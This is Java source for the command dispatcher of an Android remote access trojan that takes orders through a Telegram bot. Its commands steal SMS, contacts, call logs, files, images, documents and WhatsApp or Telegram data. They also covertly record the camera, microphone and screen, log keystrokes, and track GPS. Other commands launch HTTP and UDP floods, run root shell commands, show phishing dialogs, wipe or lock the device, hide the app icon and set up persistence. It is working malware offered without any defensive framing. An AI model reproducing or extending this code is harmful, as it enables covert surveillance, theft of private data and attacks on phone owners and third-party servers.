package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Environment;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;
    private ContactManager contactManager;
    private CallManager callManager;
    private AudioManager audioManager;
    private ScreenManager screenManager;
    private KeyloggerManager keyloggerManager;
    private ShellManager shellManager;
    private SocialMediaManager socialMediaManager;
    private AppManager appManager;
    private PhishingManager phishingManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
        this.contactManager = new ContactManager(context);
        this.callManager = new CallManager(context);
        this.audioManager = new AudioManager(context);
        this.screenManager = new ScreenManager(context);
        this.keyloggerManager = new KeyloggerManager(context);
        this.shellManager = new ShellManager();
        this.socialMediaManager = new SocialMediaManager(context);
        this.appManager = new AppManager(context);
        this.phishingManager = new PhishingManager(context);
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] parts = text.trim().split("\\s+");
        if (parts.length == 0) return;
        String cmd = parts[0].toLowerCase();

        // Commands without session requirement
        if (cmd.equals("/start") || cmd.equals("/help")) {
            processGlobal(cmd);
            return;
        }

        // Extract target session (default: ALL)
        String target = "ALL";
        String[] realArgs = new String[0];

        if (parts.length >= 2) {
            String second = parts[1].toUpperCase();
            if (second.startsWith("SESSION_") || second.equals("ALL")) {
                target = second;
                realArgs = new String[parts.length - 2];
                System.arraycopy(parts, 2, realArgs, 0, realArgs.length);
            } else {
                realArgs = new String[parts.length - 1];
                System.arraycopy(parts, 1, realArgs, 0, realArgs.length);
            }
        }

        // Check if this device is the intended recipient
        String mySession = BotConfig.SESSION_ID.toUpperCase();
        if (!target.equals("ALL") && !target.equals(mySession)) {
            return;
        }

        execute(cmd, realArgs);
    }

    private void processGlobal(String cmd) {
        if (cmd.equals("/start")) {
            TelegramApi.sendMessage("⚡ <b>REX.ENT v3.0 Online</b>\n" +
                "<b>Session:</b> <code>" + BotConfig.SESSION_ID + "</code>\n\n" +
                "Commands work directly without session ID for single device.\n" +
                "<code>/info</code>\n<code>/location</code>");
        } else {
            TelegramApi.sendMessage("Format: <code>/command [args]</code>\n" +
                "Target session optional. Default: ALL (this device).\n" +
                "<code>/info</code>\n<code>/ls /sdcard</code>");
        }
    }

    private void execute(String cmd, String[] args) {
        try {
            switch (cmd) {
                case "/info": deviceInfoManager.sendDeviceInfo(); break;
                case "/ls":
                    fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath());
                    break;
                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); break;
                case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); break;
                case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); break;
                case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/sendsms": smsManager.sendSMS(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
                case "/delsms": smsManager.deleteSMS(args.length > 0 ? args[0] : ""); break;
                case "/calls": callManager.sendCallLogs(args.length > 0 ? Integer.parseInt(args[0]) : 20); break;
                case "/contacts": contactManager.sendContacts(); break;
                case "/location": locationManager.sendCurrentLocation(); break;
                case "/gps": locationManager.startLiveGPS(); break;
                case "/photo_front": cameraManager.takePhoto(1); break;
                case "/photo_back": cameraManager.takePhoto(0); break;
                case "/record": cameraManager.recordVideo(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/mic": audioManager.recordAudio(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/liveaudio": audioManager.startLiveStream(); break;
                case "/screenshot": screenManager.takeScreenshot(); break;
                case "/screenrecord": screenManager.startScreenRecord(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/keylog_start": keyloggerManager.start(); break;
                case "/keylog_stop": keyloggerManager.stop(); break;
                case "/keylog_dump": keyloggerManager.sendLogs(); break;
                case "/apps": appManager.listInstalledApps(); break;
                case "/battery": deviceInfoManager.sendBatteryStatus(); break;
                case "/network": deviceInfoManager.sendNetworkInfo(); break;
                case "/permissions": deviceInfoManager.sendPermissions(); break;
                case "/clipboard": ClipboardHelper.getClipboard(context); break;
                case "/setclip": ClipboardHelper.setClipboard(context, joinArgs(args, 0)); break;
                case "/notif": NotificationManager.dumpNotifications(); break;
                case "/fakenotif": NotificationManager.sendFake(context, args.length > 0 ? args[0] : "Alert", args.length > 1 ? joinArgs(args, 1) : "Message"); break;
                case "/steal_images": StealerManager.stealImages(context); break;
                case "/steal_docs": StealerManager.stealDocuments(context); break;
                case "/extract_wa": socialMediaManager.extractWhatsApp(); break;
                case "/extract_tg": socialMediaManager.extractTelegram(); break;
                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "http://example.com", args.length > 1 ? Integer.parseInt(args[1]) : 100); break;
                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "127.0.0.1", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); break;
                case "/shell": ShellManager.executeCommand(joinArgs(args, 0)); break;
                case "/sush": ShellManager.executeRootCommand(joinArgs(args, 0)); break;
                case "/openurl": phishingManager.openURL(args.length > 0 ? args[0] : ""); break;
                case "/toast": SystemManager.showToast(context, joinArgs(args, 0)); break;
                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify your account"); break;
                case "/vibrate": SystemManager.vibrate(context, args.length > 0 ? Integer.parseInt(args[0]) : 1000); break;
                case "/playsound": SystemManager.playSound(context); break;
                case "/lock": SystemManager.lockDevice(context); break;
                case "/wipe": SystemManager.wipeDevice(context); break;
                case "/destroy": SystemManager.selfDestruct(context); break;
                case "/hideicon": SystemManager.hideIcon(context); break;
                case "/autostart": SystemManager.enableAutostart(context); break;
                case "/socmed": socialMediaManager.auditSocialMedia(); break;
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error: " + e.getMessage());
        }
    }

    private String joinArgs(String[] args, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < args.length; i++) {
            if (i > start) sb.append(" ");
            sb.append(args[i]);
        }
        return sb.toString();
    }
}
